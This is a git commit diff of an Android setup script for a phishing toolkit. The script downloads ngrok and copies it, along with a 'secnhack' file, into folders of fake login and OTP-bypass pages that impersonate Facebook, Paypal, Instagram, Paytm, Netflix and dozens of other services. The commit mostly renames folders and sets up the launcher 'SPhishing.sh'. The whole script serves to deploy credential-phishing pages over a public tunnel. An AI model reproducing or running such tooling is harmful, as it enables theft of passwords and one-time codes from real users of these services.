f30b488148c1b9e5a1491ddd82ba7c91352624e1
sHuBhAm_G0sAiN <63947251+ShuBhamg0sain@users.noreply.github.com>
2020-09-21 08:31:35 +0530

    Update Android-Setup.sh

--- Android-Setup.sh
+++ Android-Setup.sh
@@ -30,40 +30,40 @@ gem install lolcat
 clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
 unzip ngrok-stable-linux-arm.zip
-cp -R ngrok secnhack sites/github/
+cp -R ngrok secnhack sites/Github/
 cp -R ngrok secnhack sites/Hotstar-otp-bypass/
-cp -R ngrok secnhack sites/instagram/
+cp -R ngrok secnhack sites/Instagram/
 cp -R ngrok secnhack sites/Linkedin/
 cp -R ngrok secnhack sites/Netflix/
 cp -R ngrok secnhack sites/Paytm-Phishing/paytm/
 cp -R ngrok secnhack sites/Paytm-Phishing/signup/
-cp -R ngrok secnhack sites/spotify/
-cp -R ngrok secnhack sites/whatsapp-phishing/
-cp -R ngrok secnhack sites/facebook/
+cp -R ngrok secnhack sites/Spotify/
+cp -R ngrok secnhack sites/Whatsapp-phishing/
+cp -R ngrok secnhack sites/Facebook/
 cp -R ngrok secnhack sites/google-otp/
-cp -R ngrok secnhack sites/instafollow/
-cp -R ngrok secnhack sites/ipfinder/
-cp -R ngrok secnhack sites/ola-otpbypass/
+cp -R ngrok secnhack sites/Instafollow/
+cp -R ngrok secnhack sites/Ipfinder/
+cp -R ngrok secnhack sites/Ola-otpbypass/
 cp -R ngrok secnhack sites/UberEats-Phishing/
 cp -R ngrok secnhack sites/Zomato-Phishing/
-cp -R ngrok secnhack sites/amazonsign/
-cp -R ngrok secnhack sites/tiktok/
-cp -R ngrok secnhack sites/phonepay/
-cp -R ngrok secnhack sites/paypal/
-cp -R ngrok secnhack sites/telegram/
-cp -R ngrok secnhack sites/twitter/
-cp -R ngrok secnhack sites/flipcart/
-cp -R ngrok secnhack sites/wordpress/
-cp -R ngrok secnhack sites/snapchat/
-cp -R ngrok secnhack sites/protonmail/
-cp -R ngrok secnhack sites/stackoverflow/
-cp -R ngrok secnhack sites/ebay/
-cp -R ngrok secnhack sites/twitch/
-cp -R ngrok secnhack sites/ajio/
-cp -R ngrok secnhack sites/cryptocurrency/
-cp -R ngrok secnhack sites/mobikwik/
-cp -R ngrok secnhack sites/pinterest/
-chmod 7777 AdvPhishing.sh
+cp -R ngrok secnhack sites/Amazonsign/
+cp -R ngrok secnhack sites/Tiktok/
+cp -R ngrok secnhack sites/Phonepay/
+cp -R ngrok secnhack sites/Paypal/
+cp -R ngrok secnhack sites/Telegram/
+cp -R ngrok secnhack sites/Twitter/
+cp -R ngrok secnhack sites/Flipcart/
+cp -R ngrok secnhack sites/Wordpress/
+cp -R ngrok secnhack sites/Snapchat/
+cp -R ngrok secnhack sites/Protonmail/
+cp -R ngrok secnhack sites/Stackoverflow/
+cp -R ngrok secnhack sites/Ebay/
+cp -R ngrok secnhack sites/Twitch/
+cp -R ngrok secnhack sites/Ajio/
+cp -R ngrok secnhack sites/Cryptocurrency/
+cp -R ngrok secnhack sites/Mobikwik/
+cp -R ngrok secnhack sites/Pinterest/
+chmod 7777 SPhishing.sh
 clear
 echo ""
 echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
